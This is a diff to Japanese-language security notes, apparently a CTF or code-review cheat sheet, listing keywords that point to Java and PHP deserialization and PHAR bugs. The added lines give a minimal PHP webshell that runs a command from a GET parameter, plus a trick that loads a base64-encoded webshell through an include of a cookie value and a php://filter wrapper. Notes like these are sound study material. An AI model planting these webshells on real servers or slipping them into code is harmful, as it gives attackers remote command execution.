@@ -54,6 +54,9 @@ Injection系はevalを探す。
 ### Java Deserialization
 `readObject`,`readExternal`,`readUnshared`,`XStream`,`AC ED`で始まるバイトストリーム(Serializeされたことを示すマジックナンバー)、`ObjectInputStream`,`ObjectOutputStream`,`defaultReadObject`,`Apache Commons Collections`   
 ### PHP
+#### webshell
+``<?=`$_GET[1]`;``が最短のWebshellらしい。  
+記号とかが使えないときは`<?=include"$_COOKIE[0]`でBase64エンコードされたwebshellを`php://filter/convert.base64-decode/resource=path/to/file`でデコードしながら読み込むことでコマンド実行できる！  
 #### PHP Deserialization
 `unserialize`,`__construct`,`__destruct`,`__wakeup`,`__toString`   
 PHAR形式のファイルをアップロードできてその場所が特定できるなら(ファイル名も)、`file()`,`file_exist()`,`file_get_contents()`,`fopen()`,`rename()`,`unlink()`,`include()`。`form`とかで入力がどこにあるのかもわかるかも。PHARファイルの保存先のパスを指定するための変数`path`があるかも。   
